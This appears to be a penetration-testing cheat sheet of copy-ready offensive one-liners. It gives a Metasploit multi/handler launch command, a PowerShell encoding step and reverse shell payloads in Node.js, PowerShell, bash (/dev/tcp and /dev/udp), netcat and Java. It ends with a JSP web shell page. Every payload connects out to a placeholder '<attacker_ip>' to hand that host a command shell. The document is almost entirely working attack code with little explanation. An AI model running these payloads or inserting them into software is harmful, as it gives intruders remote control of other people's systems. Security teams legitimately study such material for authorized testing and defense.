# Miscellaneous

---

### Table of Contents
- [Metasploit Handler Oneliner](#metasploit-handler-oneliner)
- [Reverse Shells](#reverse-shells)
  * [JavaScript](#javascript)
  * [PowerShell](#powershell)
  * [Bash](#bash)
  * [Netcat](#netcat)
  * [Java](#java)

---

## Metasploit Handler Oneliner
- Create a `Metasploit` handler in one line

```bash
# E.g. Metapreter Reverse TCP
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <attacker_ip>;set LPORT <port>;run;"
```

## Reverse Shells
- Different stuff related to reverse shells

### JavaScript
- Context specific, e.g. `nodejs` (here: without URL encode)

```js
// NOT OpenBSD netcat, doesn't know -e
require("child_process").exec('nc <attacker_ip> <port> -e /bin/bash')

// Important: Use backticks here
process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'`)

// Another approach
var net = require("net"), sh = require("child_process").exec("/bin/bash");
var client = new net.Socket();
client.connect(4444, "<attack_ip>", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
sh.stderr.pipe(client);});
```

### PowerShell
- Simple oneliner for creating a `powershell` reverse shell

```powershell
# Oneliner
$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
```

-  Encode shell

```bash
iconv -f ASCII -t UTF-16LE shellcode.txt | base64 | tr -d "\n"
```

### Bash
- Doing it `bash` (and  `sh`) style

```bash
bash -l > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1

# Or

bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1

# Or
0<&196;exec 196<>/dev/tcp/<attacker_ip>/<port>; sh <&196 >&196 2>&196

# Or UDP
sh -i >& /dev/udp/<attacker_ip>/<port> 0>&1
```

### Netcat
- Reverse shell using different `netcat` flavours

```bash
# Traditional
nc <attacker_ip> <port> -e /bin/bash

# OpenBSD (no -e available)
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> <port> >/tmp/f
```

### Java
- If `java` is needed

```java
Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/<attacker_ip>/<port>;cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();
```

- If `jsp` is needed (above one is not working all the time)

```jsp
<%@ page import="java.io.*" %>
<%
    try {
         Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -l > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1"});
    }
    catch(IOException e) {
         e.printStackTrace();
    }
%>
```
